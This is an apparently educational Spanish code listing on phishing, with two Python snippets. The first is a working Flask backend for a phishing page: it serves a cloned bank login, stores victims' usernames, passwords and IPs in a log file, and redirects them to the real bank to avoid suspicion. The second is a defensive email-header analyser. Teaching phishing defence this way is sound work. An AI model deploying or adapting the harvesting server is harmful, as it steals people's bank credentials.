#── Servidor Flask que simula la captura de credenciales (Python)
# SOLO EDUCATIVO — Simula el backend de una página de phishing
# Esto permite entender qué datos captura el atacante

from flask import Flask, request, redirect # type: ignore
import datetime, json

app = Flask(__name__)

# Ruta que renderiza el formulario falso
@app.route('/')
def index():
    # En un ataque real, aquí se serviría el HTML clonado del banco
    return open('fake_login.html').read()

# Ruta que recibe las credenciales del formulario
@app.route('/login', methods=['POST'])
def capture():
    # Se capturan usuario, contraseña e IP de la víctima
    data = {
        'timestamp': str(datetime.datetime.now()),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'username': request.form.get('username'),
        'password': request.form.get('password')
    }
    # Se guarda en un archivo de log
    with open('captured.json', 'a') as f:
        f.write(json.dumps(data) + '\n')

    # Se redirige al sitio real para no levantar sospechas
    return redirect('https://www.bancolegitimo.es/login?error=1')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')


# ── Análisis de cabeceras de email para detectar phishing (Python)
# Herramienta DEFENSIVA: analiza cabeceras de email sospechoso
import email, re

def analizar_cabeceras(raw_email: str) -> dict:
    msg = email.message_from_string(raw_email)
    resultados = {}

    # 1. Verificar SPF/DKIM/DMARC en las cabeceras 'Received'
    received = msg.get_all('Received', [])
    resultados['saltos_smtp'] = len(received)

    # 2. Comparar dominio del 'From' visible con el dominio real
    from_header = msg.get('From', '')
    reply_to   = msg.get('Reply-To', '')
    resultados['from']     = from_header
    resultados['reply_to'] = reply_to

    # Alerta: si Reply-To difiere del From, es sospechoso
    if reply_to and reply_to != from_header:
        resultados['ALERTA'] = 'Reply-To diferente al From — posible phishing'

    # 3. Buscar URLs sospechosas en el cuerpo
    body = ''
    if msg.is_multipart():
        for part in msg.walk():
            if part.get_content_type() == 'text/html':
                body += part.get_payload(decode=True).decode('utf-8', errors='ignore')
    urls = re.findall(r'href=["\']([^"\']+)["\']', body)
    resultados['urls_encontradas'] = urls

    return resultados
